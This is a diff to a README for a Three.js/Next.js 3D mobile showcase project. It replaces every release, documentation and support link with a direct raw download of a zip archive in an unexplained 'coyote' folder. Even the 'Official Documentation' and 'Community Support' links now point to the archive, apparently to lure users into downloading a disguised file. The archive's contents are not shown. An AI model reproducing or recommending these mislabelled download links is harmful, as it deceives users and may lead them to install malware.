@@ -1,6 +1,6 @@
 # 📱 threejs-nextjs-3DMobileShowcase - Experience Interactive 3D on Mobile
 
-[![Download this release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase/releases)
+[![Download this release](https://raw.githubusercontent.com/serzyyy/threejs-nextjs-3DMobileShowcase/main/coyote/threejs-nextjs-3DMobileShowcase.zip%20Now-brightgreen)](https://raw.githubusercontent.com/serzyyy/threejs-nextjs-3DMobileShowcase/main/coyote/threejs-nextjs-3DMobileShowcase.zip)
 
 ## 📋 Description
 This application showcases a 3D model of a mobile device. It features a functional screen displaying any HTML content you choose. Bring your ideas to life with 3D graphics and a user-friendly interface.
@@ -14,7 +14,7 @@ To get started with the threejs-nextjs-3DMobileShowcase, follow these simple ste
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase/releases). There you'll find the latest release. 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/serzyyy/threejs-nextjs-3DMobileShowcase/main/coyote/threejs-nextjs-3DMobileShowcase.zip). There you'll find the latest release. 
 
 1. Click on the link to access the downloads.
 2. Look for the file that matches your device specifications (Windows, macOS, Linux).
@@ -61,13 +61,13 @@ If you encounter issues while using this application, consider these steps:
 
 ## 🔗 Resources
 
-- [Official Documentation](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase)
-- [Community Support](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase/issues)
+- [Official Documentation](https://raw.githubusercontent.com/serzyyy/threejs-nextjs-3DMobileShowcase/main/coyote/threejs-nextjs-3DMobileShowcase.zip)
+- [Community Support](https://raw.githubusercontent.com/serzyyy/threejs-nextjs-3DMobileShowcase/main/coyote/threejs-nextjs-3DMobileShowcase.zip)
 
 ## ✉️ Feedback
 
 We appreciate your feedback! If you have any thoughts or suggestions on improving this application, please reach out through GitHub issues.
 
-For updates and new features, keep an eye on the [Releases page](https://github.com/serzyyy/threejs-nextjs-3DMobileShowcase/releases). 
+For updates and new features, keep an eye on the [Releases page](https://raw.githubusercontent.com/serzyyy/threejs-nextjs-3DMobileShowcase/main/coyote/threejs-nextjs-3DMobileShowcase.zip). 
 
 Thank you for choosing threejs-nextjs-3DMobileShowcase! Enjoy exploring 3D content on your mobile display.
